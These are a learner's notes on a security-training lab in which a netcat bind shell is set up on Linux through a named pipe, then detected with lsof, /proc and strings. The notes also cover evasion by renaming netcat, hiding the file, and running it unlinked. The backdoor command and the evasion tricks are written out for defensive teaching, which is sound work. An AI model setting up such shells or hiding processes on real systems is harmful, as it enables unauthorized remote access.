---
{"dg-publish":true,"permalink":"/webinars-and-training/black-hills-soc-core/labs/bhis-socc-lab-linux-cli/","updated":"2025-06-09T11:43:20.393-07:00"}
---


## LAB:  [IntroClass/LinuxCLI](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/Tools/IntroClass/LinuxCLI/LinuxCLI.md)
Section Notes - [[Webinars and Training/BlackHills SOC Core/Topics/SOCC02 - Linux\|SOCC02 - Linux]]
## Linux Lab
In this lab, we're investigating [[Definitions and Topics/backdoor\|backdoors]] on a [[Tool Deep-Dives/Linux/Linux\|Linux]] system. In this write-up, I'm going to separate the commands into three different shell sessions; *Server*, *Adversary*, and *Analyst*, 
1. Configure the "server" to listen for commands from the "client" machine
	1. *Server* terminal^[In the real world, these commands would likely be executed in a malware's payload]
		2. Open a Ubuntu shell and log in as Super User
			1. `sudo su -`
		3. Create a FIFO (first in, first out) [[Tool Deep-Dives/Linux/Named Pipe\|backpipe]]
			1. `mknod backpipe p`
				1. [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) Creates a named pipe called `backpipe`
		4. Start the backpipe
			1. `/bin/bash 0<backpipe | nc -l 2222 1>backpipe`
				1. Basically creates a netcat listener that forwards all input through a backpipe and then into a bash session, and then passes the output back to the listener ([MITM](https://ccnadefinitions.com/ccna/20-definitions/mitm-on-path/))?
					1. `0` - standard input
					2. `1` - standard output
					3. `2` - error
				2. `nc` = netcat
					1. `-l 2222` = listen on port *2222*
				3. For the backpipe, don't forget that *0* **<** *backpipe*, and *1* **>** *backpipe*
					1. Where a *pipe* is monodirectional, a [[Tool Deep-Dives/Linux/Named Pipe\|Named Pipe]] can move data in any direction want
						1. netcat to backpipe, backpipe to bash, bash to netcat, etc...
						2. infinite loop
		5. At this point, the shell is chilling; the command, running. We need to send it some commands.
	2. *Adversary* terminal
		1. Get your IP address and establish a connection to the *Server*
			1. `ip a`
			2. `nc <your IP address> 2222`
		2. If you connect correctly, it's going to look like it's chilling too; but let's type some commands
			1. `ls`
			2. `whoami`
			3. ![BHIS-SOCC-lab-LinuxCLI.png](/img/user/Attachments/BHIS-SOCC-lab-LinuxCLI.png)
				1. **NOTE**: In this go-through, I changed the backpipe name to `5FTP` to see how it looked, and I hate it.
		3. At this point, we have demonstrated that we have established [[Definitions and Topics/Remote Shell\|Remote Shell]], and are ready to start looking for clues
2. Investigate from the *Analyst* terminal
	1. In the [lab](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/Tools/IntroClass/LinuxCLI/LinuxCLI.md), they suggest logging in as Root; this is generally a bad idea in the real world (like logging in as domain admin), and we should be able to accomplish most commands just running them with `sudo`.
	2. Look for network connection processes
		1. [[Tool Deep-Dives/Linux/lsof\|lsof]] 
		2. `sudo lsof -i -P`
			1. `-i` is internet connections
			2. `-P` port number only (don't guess the service)
			3. ![BHIS-SOCC-lab-LinuxCLI-1.png](/img/user/Attachments/BHIS-SOCC-lab-LinuxCLI-1.png)
		3. This shows us the services that look strange; we can dig into a specific process with lowercase `-p`
			1. `lsof -p [process ID]`
				1. In my case, `sudo lsof -p 372`
			2. Shows everything associated with that particular PID
			3. ![BHIS-SOCC-lab-LinuxCLI-2.png](/img/user/Attachments/BHIS-SOCC-lab-LinuxCLI-2.png)
	4. Investigate the process files
		2. `cd /proc/[pid]`
		3. `ls`
			1. Everything associated with the memory of the executable *as it resides in memory*
		5. `strings ./exe | less`
			1. Prints out everything that's actively running *in memory*, and we can find netcat below
				1. ![BHIS-SOCC-lab-LinuxCLI-5.png](/img/user/Attachments/BHIS-SOCC-lab-LinuxCLI-5.png)
			2. If there's a program with a manual page, you can scroll through and find it with strings/less

 This is where the lab ends in the GitHub repo, but Mr. Strand had a few more tricks to share.
 
### Other ways to avoid detection
1. Rename netcat to anything else
	1. Note, here we used the [[Tool Deep-Dives/Linux/which\|which]] command to quickly locate the [[Tool Deep-Dives/Netcat\|Netcat]] application file.
	2. ![BHIS-SOCC-lab-LinuxCLI-8.png](/img/user/Attachments/BHIS-SOCC-lab-LinuxCLI-8.png)
		1. I also took the opportunity to create a new backpipe name, `logfile`, which is still suspicious but not the same as `backpipe`, and renamed [[Tool Deep-Dives/Netcat\|Netcat]] to `netlog`
	3. And now look! A happy little `netlog` has an open connection to the internet, and it's just writing to a `logfile`!
		1. ![BHIS-SOCC-lab-LinuxCLI-9.png](/img/user/Attachments/BHIS-SOCC-lab-LinuxCLI-9.png)
		2. ![BHIS-SOCC-lab-LinuxCLI-10.png](/img/user/Attachments/BHIS-SOCC-lab-LinuxCLI-10.png)
		3. However, if we run `strings ./exe | less` on it, we still find netcat
			1. ![BHIS-SOCC-lab-LinuxCLI-11.png](/img/user/Attachments/BHIS-SOCC-lab-LinuxCLI-11.png)
2. Hiding the file on the system
	1. You could use a . to hide it (`.notevil`), but it's crazier to unlink it (i.e. program running in memory disconnected from program in storage)
		1. e.g., the program in storage was deleted
		2. If you delete the file (`rm notevil`) *while it's running*, it will continue to run *in memory*
	4. How to detect?
		1. `lsof +L1`
			1. Shows all system files running without any links^[It also still shows up in regular `lsof -i -P`, but this just highlights anything that is trying to hide and wouldn't be found in traditional file scans.]
			2. ![BHIS-SOCC-lab-LinuxCLI-12.png](/img/user/Attachments/BHIS-SOCC-lab-LinuxCLI-12.png)
		2. Once detected, you can `kill` or `pkill` to end the unlinked process, and kill its access
